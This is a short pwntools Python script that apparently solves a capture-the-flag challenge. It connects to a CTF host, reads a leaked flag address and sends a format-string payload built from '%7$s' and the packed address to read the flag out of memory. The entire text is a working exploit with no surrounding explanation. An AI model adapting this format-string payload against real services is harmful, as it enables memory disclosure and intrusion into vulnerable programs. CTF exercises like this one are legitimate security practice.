from pwn import *

r = remote('simple-ai-bot.ctf.zone', 4242)

r.sendlineafter(b'> ', b'flag')
flag_addr = int(r.recvuntil(b'\n\n').split()[-1], 16)
print(f"[+] Flag address: {hex(flag_addr)}")

payload = b'%7$sTCCC' + p64(flag_addr)
r.sendlineafter(b'> ', payload)
print(r.recvuntil(b'}').decode('utf-8'))
